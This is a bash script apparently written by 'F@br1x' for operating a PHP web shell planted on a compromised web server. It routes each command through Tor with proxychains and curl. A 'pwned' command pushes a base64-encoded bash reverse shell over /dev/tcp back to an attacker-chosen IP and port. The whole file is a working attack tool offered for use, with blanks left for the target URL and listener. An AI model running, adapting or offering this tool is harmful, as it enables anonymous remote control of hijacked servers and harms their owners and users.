#!/bin/bash
#Tool that allows you to simulate a tty via http, passing all traffic via Tor.
#if you want to have an interactive console, use rlwrap
#example sudo rlwrap ./pwnwebshell.sh
#Created by F@br1x

#here you must place the complete link where your php file is located in your web server committed
url_webshell="" #change this, example: https://example.com/shell.php

#reverse shell configuration
IP="" #change this, example 192.168.0.5
PORT="" #change this, example 443
reverse_shell=$(echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"|base64 -w 0)

#ctrl_c
function ctrl_c(){
  printf "\n\n\e[1;31mProcess canceled by the user!\n\e[0m";sleep 1.5
  tput cnorm;exit 1
}
trap ctrl_c INT

#check root
id_user=$(id -u)
if [ "$id_user" -eq 0 ]; then
  clear
else
  printf "\e[1;31m\nPlease run the script with sudo :(\n\e[0m"
  tput cnorm;exit 1
fi

#check if tor is active
check_tor=$(sudo lsof -i:9050|grep -oP "\(.*?\)"|tr -d '()')
if [ "$check_tor" == "LISTEN" ]; then
  tput civis
  printf "\n\e[1;32m Tor is active :)\n\e[0m"
  sleep 2;clear
else
  printf "\n \e[1;31mPlease start the tor service with \e[1;33msudo service tor start \e[1;31m:(\n\e[0m"
  tput cnorm;exit 1
fi

#interactive console
tput cnorm;while [ "$cmd" != "exit" ]
do
  printf "\e[1;31mpwnshell\e[1;37m:~$\e[1;32m " && read -r cmd
  proxychains -q curl -s -X GET -G $url_webshell --data-urlencode "cmd=$cmd" |awk '/<pre>/, /<\/pre>/'|sed 's/<pre>//'|sed 's/<\/pre>//'
  #run reverse shell
  if [ "$cmd" == "pwned" ]; then
    printf "\e[1;32mRun Reverse Shell :) \e[0m\n"
    proxychains -q curl -s -X GET -G $url_webshell --data-urlencode "cmd=echo $reverse_shell|base64 -d|bash"|awk '/<pre>/, /<\/pre>/'|sed 's/<pre>//'|sed 's/<\/pre>//'
  fi
done
